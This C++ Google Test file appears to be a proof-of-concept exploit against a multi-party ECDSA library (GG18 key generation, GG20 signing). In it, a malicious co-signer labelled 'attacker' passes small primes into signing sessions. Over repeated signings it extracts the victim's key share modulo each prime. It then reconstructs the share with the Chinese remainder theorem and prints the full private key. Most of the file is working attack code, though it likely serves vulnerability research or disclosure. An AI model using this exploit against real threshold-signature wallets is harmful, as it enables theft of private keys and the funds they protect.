#include <cstring>
#include <vector>
#include <google/protobuf/stubs/common.h>
#include <exception/located_exception.h>
#include "gtest/gtest.h"
#include "crypto-curve/curve.h"
#include "../../src/multi-party-ecdsa/gg18/gg18.h"
#include "../../src/multi-party-ecdsa/gg20/gg20.h"
#include "../message.h"
#include "crypto-bn/rand.h"

using std::string;
using std::vector;
using std::tuple;
using safeheron::bignum::BN;
using safeheron::curve::Curve;
using safeheron::curve::CurvePoint;
using safeheron::curve::CurveType;
using GG18Context = safeheron::multi_party_ecdsa::gg18::key_gen::Context;
using               safeheron::multi_party_ecdsa::gg20::sign::Context;
using safeheron::multi_party_ecdsa::gg18::SignKey;
using safeheron::mpc_flow::mpc_parallel_v2::ErrorInfo;

// ------------------------ Printing functions ------------------------

void print_context_stack_if_failed(GG18Context *ctx_ptr, bool failed) {
    if (failed) {
        vector<ErrorInfo> error_stack;
        ctx_ptr->get_error_stack(error_stack);
        for (const auto &err: error_stack) {
            std::cout << "error code (" << err.code_ << "): " << err.info_ << std::endl;
        }
    }
}

void print_context_stack_if_failed_gg20(Context *ctx_ptr, bool failed) {
    if (failed) {
        vector<ErrorInfo> error_stack;
        ctx_ptr->get_error_stack(error_stack);
        for (const auto &err: error_stack) {
            std::cout << "error code (" << err.code_ << "): " << err.info_ << std::endl;
        }
    }
}

void print_signatures(Context *ctx_ptr) {
    string str;
    std::cout << "    sig " << std::endl;
    CurvePoint child_pub;
    ctx_ptr->m_.ToHexStr(str);
    std::cout << "    - digest: " << str << std::endl;
    std::cout << "    - signature: " << std::endl;
    ctx_ptr->r_.ToHexStr(str);
    std::cout << "          - r: " << str << std::endl;
    ctx_ptr->s_.ToHexStr(str);
    std::cout << "          - s: " << str << std::endl;
    std::cout << "          - v: " << ctx_ptr->v_ << std::endl;
}

void print_sign_key_info(vector<GG18Context *> ctx_arr) {
    // print sign_key
    for (size_t i = 0; i < ctx_arr.size(); ++i) {
        // Json format of sign_key key
        string json_str;
        EXPECT_TRUE(ctx_arr[i]->sign_key_.ToJsonString(json_str));
        std::cout << ctx_arr[i]->sign_key_.local_party_.party_id_ << ": \n    "
                  << "  - " << ctx_arr[i]->sign_key_.X_.Inspect() << ": \n    "
                  << "  - " << json_str << std::endl;
    }
}

void print_sign_key_bas64_arr(vector<GG18Context *> ctx_arr) {
    std::cout << "Aggregated Public Key: " << ctx_arr[0]->sign_key_.X_.Inspect() << std::endl;
    std::cout << "Vault key(base64) of co-signer1, co-signer2 and co-signer3: " << std::endl;
    std::cout << "{ " << std::endl;
    for (size_t i = 0; i < ctx_arr.size(); ++i) {
        // Base64 format of sign_key key
        string base64;
        EXPECT_TRUE(ctx_arr[i]->sign_key_.ToBase64(base64));
        if (i != ctx_arr.size() - 1) {
            std::cout << "\"" << base64 << "\"," << std::endl;
        } else {
            std::cout << "\"" << base64 << "\"" << std::endl;
        }
        SignKey sign_key;
        EXPECT_TRUE(sign_key.FromBase64(base64));
        EXPECT_TRUE(sign_key.ValidityTest());
    }
    std::cout << "} " << std::endl;
}

string BNToString(BN bn) {
    string bn_string;
    bn.ToHexStr(bn_string);
    return bn_string;
}

// ------------------------ Helper functions ------------------------

void run_round(GG18Context *ctx_ptr, const std::string& party_id, int round_index,
               std::map<std::string, std::vector<Msg>> &map_id_queue) {
    bool ok = true;

    std::vector<string> out_p2p_message_arr;
    string out_bc_message;
    std::vector<string> out_des_arr;

    if (round_index == 0) {
        ok = ctx_ptr->PushMessage();
        print_context_stack_if_failed(ctx_ptr, !ok);
        ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);
        print_context_stack_if_failed(ctx_ptr, !ok);
        for (size_t k = 0; k < out_des_arr.size(); ++k) {
            map_id_queue[out_des_arr[k]].push_back({
                                                           party_id,
                                                           out_bc_message,
                                                           out_p2p_message_arr.empty() ? string()
                                                                                       : out_p2p_message_arr[k]
                                                   });
        }
    } else {
        std::vector<Msg>::iterator iter;
        for (iter = map_id_queue[party_id].begin(); iter != map_id_queue[party_id].end(); ) {
            ok = ctx_ptr->PushMessage(iter->p2p_msg_, iter->bc_msg_, iter->src_, round_index - 1);
            print_context_stack_if_failed(ctx_ptr, !ok);
            // Check crypto-mpc protocol finished with no error.

            iter = map_id_queue[party_id].erase(iter);

            if (ctx_ptr->IsCurRoundFinished()) {
                ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);
                print_context_stack_if_failed(ctx_ptr, !ok);
                for (size_t k = 0; k < out_des_arr.size(); ++k) {
                    map_id_queue[out_des_arr[k]].push_back({
                                                                   party_id,
                                                                   out_bc_message,
                                                                   out_p2p_message_arr.empty() ? string()
                                                                                               : out_p2p_message_arr[k]
                                                           });
                }
                break;
            }
        }
    }
}

void run_round_gg20(Context *ctx_ptr, const std::string& party_id, int round_index,
               std::map<std::string, std::vector<Msg>> &map_id_queue) {
    bool ok = true;

    std::vector<string> out_p2p_message_arr;
    string out_bc_message;
    std::vector<string> out_des_arr;

    if (round_index == 0) {
        ok = ctx_ptr->PushMessage();
        print_context_stack_if_failed_gg20(ctx_ptr, !ok);
        ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);
        print_context_stack_if_failed_gg20(ctx_ptr, !ok);
        for (size_t k = 0; k < out_des_arr.size(); ++k) {
            map_id_queue[out_des_arr[k]].push_back({
                                                           party_id,
                                                           out_bc_message,
                                                           out_p2p_message_arr.empty() ? string()
                                                                                       : out_p2p_message_arr[k]
                                                   });
        }
    } else {
        std::vector<Msg>::iterator iter;
        for (iter = map_id_queue[party_id].begin(); iter != map_id_queue[party_id].end(); ) {
            ok = ctx_ptr->PushMessage(iter->p2p_msg_, iter->bc_msg_, iter->src_, round_index - 1);
            print_context_stack_if_failed_gg20(ctx_ptr, !ok);
            // Check crypto-mpc protocol finished with no error.

            iter = map_id_queue[party_id].erase(iter);

            if (ctx_ptr->IsCurRoundFinished()) {
                ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);
                print_context_stack_if_failed_gg20(ctx_ptr, !ok);
                for (size_t k = 0; k < out_des_arr.size(); ++k) {
                    map_id_queue[out_des_arr[k]].push_back({
                                                                   party_id,
                                                                   out_bc_message,
                                                                   out_p2p_message_arr.empty() ? string()
                                                                                               : out_p2p_message_arr[k]
                                                           });
                }
                break;
            }
        }
    }
}

BN CRT(vector<tuple<BN, BN>> remainders) {
    // Calculate the product of the primes
    BN M = BN::ONE;
    for (size_t i = 0; i < remainders.size(); ++i) {
        BN prime = std::get<0>(remainders[i]);
        BN remainder = std::get<1>(remainders[i]);

        M = M * prime;
    }

    // Calculate CRT
    BN z = BN::ZERO;
    for (size_t i = 0; i < remainders.size(); ++i) {
        BN prime = std::get<0>(remainders[i]);
        BN remainder = std::get<1>(remainders[i]);

        BN mi = (M/prime).InvM(prime);
        z = (z + remainder * mi * M/prime) % M;
    }

    return z;
}

// ------------------------ Key Generation functions ------------------------

tuple<vector<string>, vector<BN>> keyGen(safeheron::curve::CurveType curve_type) {
    string workspace_id("workspace_0");

    std::map<std::string, std::vector<Msg>> map_id_message_queue;

    int threshold = 2;
    int n_parties = 2;

    string party_id_1 = "co_signer1";
    string party_id_2 = "co_signer2";

    std::vector<string> party_id_arr = {party_id_1, party_id_2};

    BN party_index_1(1);
    BN party_index_2(2);

    GG18Context party_context_1(2);
    GG18Context party_context_2(2);

    // party 1
    vector<string> remote_party_id_arr;
    remote_party_id_arr = {party_id_2};
    GG18Context::CreateContext(party_context_1, curve_type, workspace_id, threshold, n_parties, party_id_1, party_index_1,
                           remote_party_id_arr, true);

    // party 2
    remote_party_id_arr = {party_id_1};
    GG18Context::CreateContext(party_context_2, curve_type, workspace_id, threshold, n_parties, party_id_2, party_index_2,
                           remote_party_id_arr);
    

    vector<GG18Context *> ctx_arr = {&party_context_1, &party_context_2};

    int last_round_index;

    // round 0 ~ 3
    for (int round = 0; round <= 3; ++round) {
        // context 0 ~ 1 (co-signer1, co-signer2)
        for (int i = 0; i < 2; ++i) {
            run_round(ctx_arr[i], party_id_arr[i], round, map_id_message_queue);
        }
    }

    // // print sign_key
    // for (int i = 0; i < 2; ++i) {
    //     // Json format of sign_key key
    //     string json_str;
    //     EXPECT_TRUE(ctx_arr[i]->sign_key_.ToJsonString(json_str));
    //     std::cout << ctx_arr[i]->sign_key_.local_party_.party_id_ << ": \n    "
    //               << "  - " << json_str << std::endl;
    //     // Base64 format of sign_key key
    //     string base64;
    //     EXPECT_TRUE(ctx_arr[i]->sign_key_.ToBase64(base64));
    //     // std::cout << ctx_arr[i]->sign_key_.local_party_.party_id_ << ": \n    "
    //     //           << "  - " << base64<< std::endl;
    //     SignKey sign_key;
    //     EXPECT_TRUE(sign_key.FromBase64(base64));
    //     EXPECT_TRUE(sign_key.ValidityTest());
    // }

    // print_sign_key_info(ctx_arr);

    // print_sign_key_bas64_arr(ctx_arr);

    std::cout << "Aggregated public key: " << ctx_arr[0]->sign_key_.X_.Inspect() << std::endl;

    vector<string> sign_key_base64 = { "", "" };
    party_context_1.sign_key_.ToBase64(sign_key_base64[0]);
    party_context_2.sign_key_.ToBase64(sign_key_base64[1]);

    // Clone small primes vector
    vector<BN> p(party_context_1.p_); 

    return {sign_key_base64, p};
}

// ------------------------ Signing functions ------------------------

BN testCoSign_n_n(std::vector<std::string> &sign_key_base64, BN small_prime) {
    bool ok = true;

    std::map<std::string, std::vector<Msg>> map_id_message_queue;

    safeheron::bignum::BN m = safeheron::rand::RandomBN(256);

    string &sign_key_base64_1 = sign_key_base64[0];
    string &sign_key_base64_2 = sign_key_base64[1];

    Context party_context_1(2);
    Context party_context_2(2);

    // co-signer1 (attacker)
    ok = Context::CreateContext(party_context_1, sign_key_base64_1, m, true, small_prime);
    EXPECT_TRUE(ok);

    // co-signer2 (victim)
    ok = Context::CreateContext(party_context_2, sign_key_base64_2, m);
    EXPECT_TRUE(ok);

    vector<Context *> ctx_arr = {&party_context_1, &party_context_2};

    // round 0 ~ 9
    try {
        for (int round = 0; round <= 7; ++round) {
            // context 0 ~ 2 (co-signer1, co-signer2, co-signer3)
            for (int i = 0; i < 2; ++i) {
                // std::cout << "<== Round " << round << ", " << ctx_arr[i]->sign_key_.local_party_.party_id_ << std::endl;
                run_round_gg20(ctx_arr[i], ctx_arr[i]->sign_key_.local_party_.party_id_, round, map_id_message_queue);
            }
        }
    } catch (const safeheron::exception::LocatedException &e) {
        std::cout << e.what() << std::endl;
    }

    // for (size_t i = 0; i < ctx_arr.size(); ++i) {
    //     std::cout << "Signatures: " << std::endl;
    //     print_signatures(ctx_arr[i]);
    //     std::cout << "\n\n\n" << std::endl;
    // }

    return party_context_1.remainder;
}

BN getW(std::string &sign_key_base64) {
    Context ctx(2);
    bool ok = true;
    ok = Context::CreateContext(ctx, sign_key_base64, safeheron::rand::RandomBN(256));
    EXPECT_TRUE(ok);

    const SignKey &sign_key = ctx.sign_key_;
    const Curve * curv = GetCurveParam(sign_key.X_.GetCurveType());
    
    vector<BN> share_index_arr;
    for (size_t i = 0; i < ctx.remote_parties_.size(); ++i) {
        share_index_arr.push_back(sign_key.remote_parties_[i].index_);
    }
    share_index_arr.push_back(sign_key.local_party_.index_);
    
    vector<BN> &l_arr = ctx.local_party_.l_arr_;
    safeheron::sss::Polynomial::GetLArray(l_arr, BN::ZERO, share_index_arr, curv->n);
    ctx.local_party_.lambda_ = l_arr[share_index_arr.size()-1];

    return (sign_key.local_party_.x_ * ctx.local_party_.lambda_) % curv->n;
}

TEST(CoSign, Sign_n_n) {
    std::cout << "##### Testing exfiltrating the other party's private key share" << std::endl << std::endl;

    const Curve * curv = GetCurveParam(safeheron::curve::CurveType::SECP256K1);

    // Generate keys
    std::cout << "### Generate signing keys" << std::endl << std::endl;
    tuple<vector<string>, vector<BN>> keyGenRet = keyGen(safeheron::curve::CurveType::SECP256K1);
    vector<string> sign_key_base64 = std::get<0>(keyGenRet);
    vector<BN> small_primes = std::get<1>(keyGenRet);

    // Sign for each small prime
    std::cout << "### Sign and perform key exfiltration attack" << std::endl << std::endl;
    vector<tuple<BN, BN>> remainders;
    for (size_t i = 0; i < small_primes.size(); ++i) {
    // for (int i = 0; i < 1; ++i) {
        std::cout << i + 1 << "/" << small_primes.size() << " Signing to exfiltrate: victim_key % " << BNToString(small_primes[i]) << std::endl;
        BN remainder = testCoSign_n_n(sign_key_base64, small_primes[i]);

        std::cout << "Remainder exfiltrated: " << BNToString(remainder) << std::endl;

        remainders.push_back({small_primes[i], remainder});
    }

    // Use all the remainders to reconstruct the victim's private key
    BN exfiltrated_victim_w = CRT(remainders);
    BN victim_w = getW(sign_key_base64[1]);
    BN attacker_w = getW(sign_key_base64[0]);

    EXPECT_TRUE(exfiltrated_victim_w == victim_w);
    // std::cout << "reconstructed victim's w  = " << BNToString(exfiltrated_victim_w) << std::endl;
    // std::cout << "actual victim's w         = " << BNToString(victim_w) << std::endl;

    BN reconstructed_private_key = (attacker_w + exfiltrated_victim_w) % curv->n;

    std::cout << std::endl << "### Attack results" << std::endl << std::endl;
    std::cout << "reconstructed private key = " << BNToString(reconstructed_private_key) << std::endl;
    std::cout << "reconstructed public key:" << (curv->g * reconstructed_private_key).Inspect() << std::endl;
}

int main(int argc, char **argv) {
    ::testing::InitGoogleTest(&argc, argv);
    int ret = RUN_ALL_TESTS();
    google::protobuf::ShutdownProtobufLibrary();
    return ret;
}
